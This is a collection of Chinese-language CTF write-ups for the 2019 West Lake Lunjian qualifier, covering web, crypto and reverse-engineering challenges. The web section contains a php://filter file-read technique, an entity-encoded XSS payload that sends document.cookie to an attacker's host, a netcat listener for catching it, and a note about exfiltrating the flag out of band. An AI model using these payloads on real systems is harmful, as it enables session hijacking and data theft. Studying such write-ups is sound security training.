# 2019西湖论剑预选赛
## 题目类型：
|类型|年份|难度|
|:---:|:---:|:---:|
|官方赛事题|2019|中|

# 题目下载：
+ 链接: https://pan.baidu.com/s/1B9Coqdmh8wYnYo3eW3MOMg 提取码: bagw

# 网上公开WP:
+ https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA
+ https://www.anquanke.com/post/id/176136/
+ https://www.jianshu.com/p/c14970447ddd
+ https://blog.csdn.net/qq_41420747/article/details/89076214

# 本站备份WP：
**感谢：冷逸、fIappy[暂时未联系到作者]**  
## Web
**作者：冷逸**  
### babyt3

题目地址：http://61.164.47.198:10000/

打开地址，发现提示：

```
include $_GET['file'] 
```

目测为文件包含，尝试读index.php的源码，

> http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=index.php

还原后如下：

```
<?php
$a = @$_GET['file'];
if (!$a) {
    $a = './templates/index.html';
}
echo 'include $_GET[\'file\']';
if (strpos('flag',$a)!==false) {
    die('nonono');
}
include $a;
?>

<!--hint: ZGlyLnBocA== -->
```

发现提示，其实右击查看源代码也可以看到..

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1yuaaon8fj30qf0ewjs7.jpg)

base64解码后得到dir.php

读dir.php

> http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=dir.php

```
<?php
$a = @$_GET['dir'];
if(!$a){
$a = '/tmp';
}
var_dump(scandir($a));
```

得知该文件可以列目录，尝试列目录

> http://61.164.47.198:10000/dir.php?dir=/

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1yucp71wyj31gy0a9abh.jpg)

这样得到ffffflag_1s_Her4文件

使用file读取，得到flag

> http://61.164.47.198:10000/?file=php://filter/read=convert.base64-encode/resource=/ffffflag_1s_Her4

### Breakout

题目地址：http://61.164.47.198:10001/

打开后是一个登录界面，随意输入账号密码，即可登录进去，登录后界面如下：

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1z20yr14hj31a70n70ui.jpg)

第一个子页面可以留言评论,第二个子页面是将某个链接发送给管理员,管理员会携带cookie查看该页面,第三个子页面是执行命令和清除留言,尝试直接输入命令执行,提示说要有管理员权限才可以执行命令.到这里,很显然这是一个xss漏洞盗取管理员cookie然后登录管理员账号去执行命令.

使用如下payload绕过过滤

```
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:window.location.href='http://ip:port/?a='+document.cookie"
```

然后在report哪里提交

> http://61.164.47.198:10001/main.php

有个验证码，爆破脚本如下

```
import hashlib


def md5(key):
    m = hashlib.md5()
    m.update(key.encode('utf-8'))
    return m.hexdigest()


for i in range(1000000000):
    if md5(str(i))[0:6] == ' b0f446
':
        print(i)
        break
```
自己服务器监听

>  nc -lvvp 8000

可得到cookie

然后执行命令，使用ceye外带flag

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1zj906mcaj30d102lab6.jpg)

### 猜猜flag是什么

题目地址： http://61.164.47.198:10002/

dir扫描得到

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1zjdkm818j30re0dp3z5.jpg)

发现.DS_Store 泄露

脱下来

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1zjftxtxej30rs0390sq.jpg)

发现e10adc3949ba59abbe56e057f20f883e目录

继续扫描，发现git文件

![](http://ww1.sinaimg.cn/large/007F8GgBly1g1zjic8kx7j30rf0e7dhd.jpg)

使用Githack下载后得到三个文件

```
BackupForMySite.zip
index.php
lengzhu.jpg
```

用明文攻击解开压缩包BackupForMySite.zip，得到里面的code
注：只能使用bindzip进行压缩，反正我7-zip压缩的失败

或者使用rbkcrack进行明文攻击

解开后得到code is 后面是一个随机串

带入首页得到一串数字

然后使用使用php_mt_seed：你的数字

然后访问/flag/得到的数字.txt

得到flag

## 二.Crypto：
**作者：fIappy [暂时未联系到作者]**  

---

题目: 哈夫曼之谜  
题目链接:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752d3c1f20.zip&type=attach&feature=custom  
题目描述:  
打开压缩包后得到一个文本文件,内容如下  
```
11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110

a:4
d:9
g:1
f:5
l:1
0:7
5:9
{:1
}:1
```
根据题目名哈夫曼之谜,很容易想到是哈夫曼编码与解码的问题  
题目分析:  
对于哈夫曼编码的介绍就不多说,每个计算机专业的同学应该上数据结构课都学过,具体可以参考百度科:https://baike.baidu.com/item/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81/1719730?fr=aladdin  

对于这个题目,第一行的01串显然就是flag编码后的结果,被编码的元素是左边一列的字母,他们对应的权重在第二列,对于一个哈夫曼编码问题,首先需要根据元素的权重构建哈夫曼树,然后对要编码的字符串按照一定的算法进行编码,然后再按照一定的算法进行解码.这些算法我们不需要知道详细过程,做题时可完全没有必要自己实现一个哈夫曼编码,太费时间,所以我们可以参考网上实例代码进行修改即可  

参考的哈夫曼编码代码的博客地址:https://blog.csdn.net/qq_40328281/article/details/80412359  

代码分析:要修改的地方其实就是最大的编码长度maxn,text长度n,权重数据weight和text数组.  


```
#include "pch.h"
#include <iostream>


const int maxvalue = 200;
const int maxbit = 200;
const int maxn = 200;
#include "stdio.h"
#include "stdlib.h"
using namespace std;
struct haffnode
{
    char ch;
    int weight;
    int flag;
    int parent;
    int leftchild;
    int rightchild;
};
struct code
{
    int bit[maxn];
    int start;
    int weight;
    char ch;
};
void haffman(int weight[], char text[], int n, haffnode hafftree[])
{
    int j, m1, m2, x1, x2, i;
    for (i = 0; i < 2 * n - 1; i++)
    {
        if (i < n)
        {
            hafftree[i].weight = weight[i];
            hafftree[i].
                ch = text[i];
        }
        else
        {
            hafftree[i].weight = 0;
            hafftree[i].ch = '#';
        }
        hafftree[i].parent = 0;
        hafftree[i].flag = 0;
        hafftree[i].leftchild = -1;
        hafftree[i].rightchild = -1;
    }
    for (i = 0; i < n - 1; i++)
    {
        m1 = m2 = maxvalue;
        x1 = x2 = 0;
        for (j = 0; j < n + i; j++)
        {
            if (hafftree[j].weight < m1&&hafftree[j].flag == 0)
            {
                m2 = m1;
                x2 = x1;
                m1 = hafftree[j].weight;
                x1 = j;
            }
            else if (hafftree[j].weight < m2&&hafftree[j].flag == 0)
            {
                m2 = hafftree[j].weight; x2 = j;
            }
        }
        hafftree[x1].parent = n + i;
        hafftree[x2].parent = n + i;
        hafftree[x1].flag = 1;
        hafftree[x2].flag = 1;
        hafftree[n + i].weight = hafftree[x1].weight + hafftree[x2].weight;
        hafftree[n + i].leftchild = x1; hafftree[n + i].rightchild = x2;
    }
}
void haffmancode(haffnode hafftree[], int n, code haffcode[])
{
    code cd; int i, j; int child, parent;
    for (i = 0; i < n; i++)
    {
        cd.start = n - 1;
        cd.weight = hafftree[i].weight;
        cd.ch = hafftree[i].ch;
        child = i;
        parent = hafftree[child].parent;
        while (parent != 0)
        {
            if (hafftree[parent].leftchild == child)
                cd.bit[cd.start] = 0;
            else cd.bit[cd.start] = 1;
            cd.start--;
            child = parent;
            parent = hafftree[child].parent;
        }
        for (j = cd.start + 1; j < n; j++)
            haffcode[i].bit[j] = cd.bit[j];
        haffcode[i].start = cd.start;
        haffcode[i].weight = cd.weight;
        haffcode[i].ch = cd.ch;
    }
}
void ccode(haffnode hafftree[], int n)
{
    int i, j = 0, m = 2 * n - 1;
    char b[maxn];
    memset(b, '', sizeof(b));
    i = m - 1;
    scanf("%s", b);
    while (b[j] != '')
    {
        if (b[j] == '0')
            i = hafftree[i].leftchild;
        else
            i = hafftree[i].rightchild;
        if (hafftree[i].leftchild == -1)
        {
            printf("%c", hafftree[i].ch);
            i = m - 1;
        }
        j++;
    }
}
int main()
{
    int n = 9;
    int weight[] = { 4, 9, 1, 5, 1,7,9,1,1 };
     char text[] = { 'a','5','{','f','g','0','d','}','l' };
    haffnode myhafftree[maxvalue];
    code myhaffcode[maxvalue]  ;// "11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110";
    haffman(weight, text, n, myhafftree);
    haffmancode(myhafftree, n, myhaffcode);
    ccode(myhafftree, n);
    return 0;
}
```

运行结果:
![](https://upload-images.jianshu.io/upload_images/15360385-dcf3150a76b5b57c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

## 三.re
**作者：fIappy [暂时未联系到作者]**

---

1.junk_instruction
题目文件:https://xpro-adl.91ctf.com/userdownload?filename=1904055ca752e532f14.zip&type=attach&feature=custom

从题目名字看出,这是一个含有垃圾指令例如花指令的程序.

而且从文件图标来看,显然是一个mfc写的程序.

打开程序发现需要输入flag,然后点击check来检测是否正确.可以猜测是将我们的输入进行各种加密处理然后和程序中的某个字符串(可能是动态生成的)比较,得出是否输入正确.

通过xspy工具:https://github.com/lynnux/xspy/tree/master/xspydll

找到check按钮的处理函数:

![](https://upload-images.jianshu.io/upload_images/15360385-b2d3c8b1ff0bd476.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

查看该函数

![](https://upload-images.jianshu.io/upload_images/15360385-0344d694b20b1d3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

从这个check函数的逻辑看,应该是402600对输入进行判断,下面2个if分支对应于输入正确和错误的弹窗.跟进402600,发现该函数后面又几段花指令,例如这个:

![](https://upload-images.jianshu.io/upload_images/15360385-79c1c63dd4487a1a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

call %+5直到下面的retn都是花指令,找到这几段类似的代码,全部nop掉即可.

然后f5反编译:
```
  v2 = (const WCHAR *)sub_401570(&a1);
  v17 = (void *)sub_4030A0(v2);
  v13 = v17;
  LOBYTE(v70) = 1;
  v3 = (void *)sub_401570(v17);
  sub_403000((int)&v60, v3);
  LOBYTE(v70) = 3;
  sub_4012A0(&v18);
  v19 = (char *)unknown_libname_1(&v60);
  v54 = v19;
  v16 = v19 + 1;
  v54 += strlen(v54);
  v14 = ++v54 - (v19 + 1);
  v12 = v54 - (v19 + 1);
  v68 = 0;
  memset(&v69, 0, 0x27u);
  strncpy(&v68, v19, v54 - (v19 + 1));
  if ( sub_402AF0(&v68) )                       // 判断输入长度
  {
    v57 = 0;
    v59 = 0;
LABEL_7:
    v58 = v59;
  }
  else
  {
    v63 = 1919252337;//这里是rc4密钥
    v64 = 1769306484;
    v65 = 28783;
    v66 = 0;
    memset(&v67, 0, 0xF5u);
    v61 = 0;
    memset(&v62, 0, 0xFFu);
    v7 = 0;
    memset(&v8, 0, 0x1FFu);
    v53 = (const char *)&v63;
    v10 = (int *)((char *)&v63 + 1);
    v53 += strlen(v53);
    v9 = ++v53 - ((const char *)&v63 + 1);
    v6 = v53 - ((const char *)&v63 + 1);
    v5 = &v63;
    sub_402CA0(&v61);
    v56 = &v68;
    v15 = &v69;
    v56 += strlen(v56);
    v11 = ++v56 - &v69;
    sub_402E80(v20, &v61, &v68, v56 - &v69);
    for ( i = 31; i >= 0; --i )
    {
      if ( *(&v68 + i) != *((char *)&savedregs + i + (_DWORD)&loc_4026B7 - 4204867) )
      {
        v59 = 0;
        goto LABEL_7;
      }
    }
    v58 = 1;
  }
  LOBYTE(v70) = 0;
  sub_403060((int)&v60);
  v70 = -1;
  sub_4012A0(&a1);
  return v58;
}
```
通过分析程序先将输入进行了逆序,再使用rc4加密.

rc4数组初始化:该函数也是被花指令的,使用相同方法处理即可
```
void __cdecl sub_402CA0(_BYTE *a1, int a2, unsigned int a3)
{
  char v3; // ST1B_1
  int v4; // [esp+8h] [ebp-114h]
  signed int i; // [esp+10h] [ebp-10Ch]
  signed int j; // [esp+10h] [ebp-10Ch]
  char v7; // [esp+18h] [ebp-104h]
  char v8; // [esp+19h] [ebp-103h]

  v4 = 0;
  v7 = 0;
  memset(&v8, 0, 0xFFu);
  for ( i = 0; i < 256; ++i )
  {
    a1[i] = i;
    *(&v7 + i) = *(_BYTE *)(a2 + i % a3);
  }
  for ( j = 0; j < 256; ++j )
  {
    v4 = (*(&v7 + j) + v4 + (unsigned __int8)a1[j]) % 256;
    v3 = a1[j];
    a1[j] = a1[v4];
    a1[v4] = v3;
  }
}
```
进行比较判断

![](https://upload-images.jianshu.io/upload_images/15360385-38580c24e27c54b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

加密函数:该函数也是被花指令的,使用相同方法处理即可
```
int __stdcall sub_402E80(int a1, int a2, unsigned int a3)
{
  int result; // eax
  char v4; // ST1B_1
  int v5; // [esp+Ch] [ebp-18h]
  unsigned int i; // [esp+10h] [ebp-14h]
  int v7; // [esp+14h] [ebp-10h]

  v7 = 0;
  v5 = 0;
  for ( i = 0; i < a3; ++i )
  {
    v7 = (v7 + 1) % 256;
    v5 = (v5 + *(unsigned __int8 *)(v7 + a1)) % 256;
    v4 = *(_BYTE *)(v7 + a1);
    *(_BYTE *)(v7 + a1) = *(_BYTE *)(v5 + a1);
    *(_BYTE *)(v5 + a1) = v4;
    *(_BYTE *)(i + a2) ^= *(_BYTE *)((*(unsigned __int8 *)(v5 + a1) + *(unsigned __int8 *)(v7 + a1)) % 256 + a1);
    result = i + 1;
  }
  return result;
}
```
而check函数的这段正是用于比较的数组

![](https://upload-images.jianshu.io/upload_images/15360385-d6eb3df62eed8871.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  

最种解密如下:

![](https://upload-images.jianshu.io/upload_images/15360385-ed949923f1c4ad8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)  
```
import base64
key = "qwertyuiop" 
res = [0xfa,0x45,0xd0,0x9e,0,0xc,0x9f,0x82,0x57,0x89,0xe5,0xf7,0xb0,0x64,0x76 ,0xdd,0xaf,0xff,0x7d,0x91,0x16,0xcb,0x3e,0x6e,0x7e,0x19,0xdd,0xc8,0x26,0xd0,0xd6,0x5b] 
res = res[::-1] 
tmp = "" 
for i in res:
    tmp += chr(i)
tmp = base64.b64encode(tmp) 
print tmp
ff = "f250e3d75820847d427f3af11a783379" 
flag = ['*']*32 
for i in range(16): 
    flag[i] = ff[31-i] 
    flag[31-i] = ff[i]
print "flag{%s"%("".join(flag))+'}'
```
W9bQJsjdGX5uPssWkX3/r912ZLD35YlXgp8MAJ7QRfo=
flag{973387a11fa3f724d74802857d3e052f}

2.Testre
题目文件链接: https://xproadl.91ctf.com/userdownload?filename=1904055ca752e746df2.zip&type =attach&feature=custom

ida打开文件,main函数如下
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  void *ptr; // ST10_8
  __int64 v5; // [rsp+18h] [rbp-28h]
  char v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+3Ch] [rbp-4h]

  v7 = 0;
  v5 = 256LL;
  sub_400D00((__int64)&v6, 0x11uLL);
  ptr = malloc(0x100uLL);
  sub_400700(ptr, &v5, (__int64)&v6, 0x10uLL);
  free(ptr);
  return 0LL;
}
```
跟进sub_400D00,发现是个接受输入的函数

跟进sub_400700:
```
 for ( i = 0LL; i < v28; ++i )
  {
    v13 = *(unsigned __int8 *)(v25 + i);
    *((_BYTE *)v26 + i) = byte_400E90[i % 0x1D] ^ v13;
    *((_BYTE *)v26 + i) += *(_BYTE *)(v25 + i);
  }
  while ( 1 )
  {
    v12 = 0;
    if ( v17 < v28 )
      v12 = ~(*(_BYTE *)(v25 + v17) != 0);
    if ( !(v12 & 1) )
      break;
    ++v17;
  }
  ```
这部分将一个字符串和输入进行了异或加密,但后面会发现,并没有用到
```
 while ( v20 < v28 )                           // 这里是base58编码的处理过程
  {
    v21 = *(unsigned __int8 *)(v25 + v20);
    for ( j = n - 1; ; --j )
    {
      v10 = 1;
      if ( j <= v18 )
        v10 = v21 != 0;
      if ( !v10 )
        break;
      v22 = v11[j] << 6;
      v21 += v11[j] << 8;
      v9 = 64;
      v11[j] = v21 % 58;
      *((_BYTE *)v26 + j) = v22 & 0x3F;
      v22 >>= 6;
      v21 /= 58;
      v27 /= v9;
      if ( !j )
        break;
    }
    ++v20;
    v18 = j;
  }
```
这个循环才是主菜,我们暂时不去详细分析算法过程,比较复杂,但是可以看到常量58,被模了一下和被除了一下.继续看下面
```
 if ( *v30 > n + v17 - j )
  {
    if ( v17 )                                  // 不会执行到这里面,又是干扰分析
    {
      c = 61;
      memset(encode_input, '1', v17);
      memset(v26, c, v17);
    }
    v20 = v17;
    while ( j < n )
    {
      v4 = v11;
      *((_BYTE *)encode_input + v20) = byte_400EB0[v11[j]];// base58编码表代换
      *((_BYTE *)v26 + v20++) = byte_400EF0[v4[j++]];// 这个base64编码表并没有参与编码计算,干扰项
    }
    *((_BYTE *)encode_input + v20) = 0;
    *v30 = v20 + 1;
    if ( !strncmp((const char *)encode_input, "D9", 2uLL)// 结果比较
      && !strncmp((const char *)encode_input + 20, "Mp", 2uLL)
      && !strncmp((const char *)encode_input + 18, "MR", 2uLL)
      && !strncmp((const char *)encode_input + 2, "cS9N", 4uLL)
      && !strncmp((const char *)encode_input + 6, "9iHjM", 5uLL)
      && !strncmp((const char *)encode_input + 11, "LTdA8YS", 7uLL) )
    {
      HIDWORD(v6) = puts("correct!");
    }
    v32 = 1;
    v14 = 1;
  }
```
到这里发现有2个数组,分别是
```
.rodata:0000000000400EB0 byte_400EB0     db '1'                  ; DATA XREF: sub_400700+446↑r
.rodata:0000000000400EB1 a23456789abcdef db '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',0
.rodata:0000000000400EEB                 align 10h
.rodata:0000000000400EF0 ; char byte_400EF0[]
.rodata:0000000000400EF0 byte_400EF0     db 'A'                  ; DATA XREF: sub_400700+464↑r
.rodata:0000000000400EF1 aBcdefghijklmno db 'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0
```

显然一个是base64编码表,一个是base58编码表,最开始把base58编码表看成了是数字加所有字母,浪费大量时间分析.

仔细观察代码,其实进行base64编码的过程是针对v26,但是v26变量指向的内存完全没有和最后的比较产生关系,所以这都是干扰做题的

最后观察比较语句,提取出最终串:D9cS9N9iHjMLTdA8YSMRMp

对其进行base58解码就是flag:
```
import base58 as bs
bs.b58decode('D9cS9N9iHjMLTdA8YSMRMp')
#output: base58_is_boring
```

base58通过pip install base58即可安装

3.easyCpp
题目链接： https://xproadl.91ctf.com/userdownload?filename=1904055ca752e6ae1c5.zip&type =attach&feature=custom

这个要求对 c++的 stl 比较熟悉

直接来到main:
```
 for ( i = 0; i <= 15; ++i )
  {
    scanf("%d", &v25[4 * i], v15);
    std::vector<int,std::allocator<int>>::push_back(&our_input, &v25[4 * i]);
  }
  for ( j = 0; j <= 15; ++j )                   // 生成斐波那契数列
  {
    LODWORD(input_begin) = fib(j);
    std::vector<int,std::allocator<int>>::push_back(&fib_list, &input_begin);
  }```
接受输入和生成斐波那契数列
```
  std::vector<int,std::allocator<int>>::push_back(&v20, v25);
  v7 = std::back_inserter<std::vector<int,std::allocator<int>>>(&v20);
  input_end = std::vector<int,std::allocator<int>>::end(&our_input);
  input_begin = std::vector<int,std::allocator<int>>::begin(&our_input);
  v9 = __gnu_cxx::__normal_iterator<int *,std::vector<int,std::allocator<int>>>::operator+(&input_begin, 1LL);// 对input每个元素加1
  std::transform<__gnu_cxx::__normal_iterator<int *,std::vector<int,std::allocator<int>>>,std::back_insert_iterator<std::vector<int,std::allocator<int>>>,main::{lambda(int)#1}>(
    v9,
    input_end,
    v7,
    v25);
  std::vector<int,std::allocator<int>>::vector(&v23, input_end, v10);
  std::vector<int,std::allocator<int>>::end(&v20);
  std::vector<int,std::allocator<int>>::begin(&v20);
  std::accumulate<__gnu_cxx::__normal_iterator<int *,std::vector<int,std::allocator<int>>>,std::vector<int,std::allocator<int>>,main::{lambda(std::vector<int,std::allocator<int>>,int)#2}>((unsigned __int64)&input_begin);
  std::vector<int,std::allocator<int>>::operator=(&v21, &input_begin);
  std::vector<int,std::allocator<int>>::~vector(&input_begin);
  std::vector<int,std::allocator<int>>::~vector(&v23);
  if ( (unsigned __int8)std::operator!=<int,std::allocator<int>>(&v21, &fib_list) )// 必须相同
  {
    puts("You failed!");
    exit(0);
  }
transform是把v9的每个元素通过匿名函数进行转换,结果存入v20
```
进入transform:
```
   v4 = (int *)__gnu_cxx::__normal_iterator<int *,std::vector<int,std::allocator<int>>>::operator*(&input_begin_1);
    v11 = main::{lambda(int)#1}::operator() const((_DWORD **)&v29, *v4);// 把输入的vector和v29相加
    v5 = std::back_insert_iterator<std::vector<int,std::allocator<int>>>::operator*(&v24_backinsert);
    std::back_insert_iterator<std::vector<int,std::allocator<int>>>::operator=(v5, &v11);
    __gnu_cxx::__normal_iterator<int *,std::vector<int,std::allocator<int>>>::operator++(&input_begin_1);
    std::back_insert_iterator<std::vector<int,std::allocator<int>>>::operator++(&v24_backinsert);
```
再进入
```
main::{lambda(int)#1}::operator() const((_DWORD *)&v29, v4);:
__int64 __fastcall main::{lambda(int)#1}::operator() const(_DWORD **a1, int a2)
{
  return (unsigned int)(**a1 + a2);
}
```
这下就知道这个就是把输入和输入的第一个元素相加

接着看`std::accumulate`,这个程序的`std::accumulate`和c++的不一样不知道是不是ida识别错误,打开看这个函数,内部还是有个匿名函数,静态分析比较复杂,我们通过动态调试来分析
根据 
```
std::vector<int,std::allocator<int>>::operator=(&v25, &input_begin);
std::vector<int,std::allocator<int>>::~vector(&input_begin);
std::vector<int,std::allocator<int>>::~vector(&v27);
if ( (unsigned __int8)std::operator!=<int,std::allocator<int>>(&v25, &fib_list) )// 必须相同
```
我们需要分析v25的内容,通过下断`std::vector<int,std::allocator<int>>::~vector(&input_begin);`再查看v25:
```
gef➤ x/10gx $rsp+0x90
0x7fffc6f61660: 0x0000000002007f10 0x0000000002007f50
0x7fffc6f61670: 0x0000000002007f50 0x0000000000000000
0x7fffc6f61680: 0x0000000000000000 0x0000000000000000
0x7fffc6f61690: 0x0000000000000000 0x0000000000000000
0x7fffc6f616a0: 0x0000000000000000 0x0000000000000000

地址为0x0000000002007f10, 再查看堆:

…….]
Chunk(addr=0x2007e30, size=0x50, flags=PREV_INUSE)
[0x0000000002007e30 00 00 00 00 00 00 00 00 24 00 00 00 23 00 00 00 ……..$…#…]
Chunk(addr=0x2007e80, size=0x50, flags=PREV_INUSE)
[0x0000000002007e80 20 7e 00 02 00 00 00 00 24 00 00 00 23 00 00 00 ~……$…#…]
Chunk(addr=0x2007ed0, size=0x40, flags=PREV_INUSE)
[0x0000000002007ed0 00 00 00 00 00 00 00 00 23 00 00 00 22 00 00 00 ……..#…”…]
Chunk(addr=0x2007f10, size=0x50, flags=PREV_INUSE)
[0x0000000002007f10 27 00 00 00 26 00 00 00 25 00 00 00 24 00 00 00

gef➤ x/16wx 0x0000000002007f10
0x2007f10: 0x00000027 0x00000026 0x00000025 0x00000024
0x2007f20: 0x00000023 0x00000022 0x00000021 0x00000020
0x2007f30: 0x0000001f 0x0000001e 0x0000001d 0x0000001c
0x2007f40: 0x0000001b 0x0000001a 0x00000019 0x0000000c
```
发现这个是把输入进行了反向. 总结一下加密流程

1.接受16个数字输入
2.计算斐波那契数列前16项
3.把16个数字输入从第二个元素开始,都加上第一个元素
4.将3的结果反向
5.将4的结果和2的结果比较,完全相同则输入的是flag

解密脚本:
```
a = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987] 
c = a[::-1] 
d = [987] 
for i in range(1,len(c)): 
    d.append(c[i]-987)
import pprint
pprint.pprint(d)
```
输出:
```
[987,
 -377,
 -610,
 -754,
 -843,
 -898,
 -932,
 -953,
 -966,
 -974,
 -979,
 -982,
 -984,
 -985,
 -986,
 -986]
```
getflag:
```
from pwn import *

p = process('./easyCpp')
input_ = [987,
 -377,
 -610,
 -754,
 -843,
 -898,
 -932,
 -953,
 -966,
 -974,
 -979,
 -982,
 -984,
 -985,
 -986,
 -986]
for i in input_:
    p.sendline(str(i))

p.interactive()
```